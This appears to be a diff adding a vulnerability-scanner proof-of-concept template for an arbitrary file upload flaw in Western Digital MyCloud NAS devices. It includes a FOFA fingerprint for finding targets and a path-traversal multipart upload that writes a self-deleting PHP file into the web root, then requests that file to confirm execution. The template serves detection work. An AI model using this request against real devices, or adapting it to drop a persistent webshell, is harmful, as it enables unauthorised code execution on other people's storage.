@@ -1,0 +1,50 @@
+id: poc-yaml-west-nas-addons-anyfile-upload
+info:
+  name: 西部数码 NAS addons 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: western_digital_mycloud_nas
+  fofa: icon_hash="-1074357885" && header="PHP/5.4.16"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /web/addons/upload.php
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+  data: '------WebKitFormBoundary
+
+    Content-Disposition: form-data; name="folder"
+
+
+    /../../../../../../../../var/www/
+
+    ------WebKitFormBoundary
+
+    Content-Disposition: form-data; name="name"
+
+
+    1
+
+    ------WebKitFormBoundary
+
+    Content-Disposition: form-data; name="index"
+
+
+    {{.t1}}.php
+
+    ------WebKitFormBoundary
+
+    Content-Disposition: form-data; name="file"; filename="1.png"
+
+
+    <?=md5({{.t1}});unlink(__FILE__);
+
+    ------WebKitFormBoundary--'
+  expression: status_code == 200 && body == ""
+- method: GET
+  path: /1-{{.t1}}.php
+  expression: status_code == 200 && body == t2
+transport: http
